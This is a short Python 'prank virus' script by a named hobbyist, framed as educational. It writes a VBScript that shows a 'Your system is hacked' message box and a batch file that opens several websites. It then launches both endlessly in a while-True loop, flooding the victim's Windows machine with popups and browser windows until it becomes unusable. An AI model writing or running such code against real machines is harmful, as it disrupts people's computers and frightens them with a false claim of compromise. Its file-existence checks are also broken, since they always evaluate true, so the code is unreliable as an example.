# This program has just made for educational and testing purpose by Maruf Hasan
# Use it at your own risk
# Love you all
# Don't forget to visit my GITHUB - @the-psycoder, FACEBOOK - @psyman.one

import os

first_execution_command = 'x=msgbox("Your system is hacked, hahahahahaha!!!", 5+16, "Evil Mode")'
second_execution_command = 'echo @ff\nstart www.youtube.com\nstart www.fast.com\nstart www.netflix.com'

fe_old_file = "F:\\virone.txt"
fe_new_file = "F:\\virone.vbs"
se_old_file = "F:\\virtwo.txt"
se_new_file = "F:\\virtwo.bat"

with open(fe_old_file, 'w+') as fe_file:
    fe_file.write(first_execution_command)
    fe_file.close()

with open(se_old_file, 'w+') as se_file:
     se_file.write(second_execution_command)
     se_file.close()

try:
    if str(os.path.isfile(str(fe_file))) and str(os.path.isfile(str(se_file))):
            os.rename(fe_old_file, fe_new_file)
            os.rename(se_old_file, se_new_file)
            while True:
                os.startfile(fe_new_file)
                os.startfile(se_new_file)
except:
    if str(os.path.isfile(fe_new_file)) and str(os.path.isfile(se_new_file)):
            while True:
                os.startfile(fe_new_file)
                os.startfile(se_new_file)